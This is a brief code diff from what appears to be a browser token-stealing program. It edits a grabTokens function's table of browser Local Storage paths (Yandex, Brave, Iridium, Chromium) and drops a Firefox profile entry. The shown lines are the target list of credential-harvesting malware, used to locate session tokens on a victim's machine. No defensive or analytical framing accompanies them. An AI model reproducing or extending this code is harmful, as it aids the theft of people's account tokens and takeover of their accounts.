@@ -88,7 +88,6 @@ def grabTokens():
         'Yandex': appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
         'Brave': appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
         'Iridium': appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Firefox': roaming + r'\\Mozilla\\Firefox\\Profiles\\',
         'Ungoogled Chromium': appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\'
     }
 
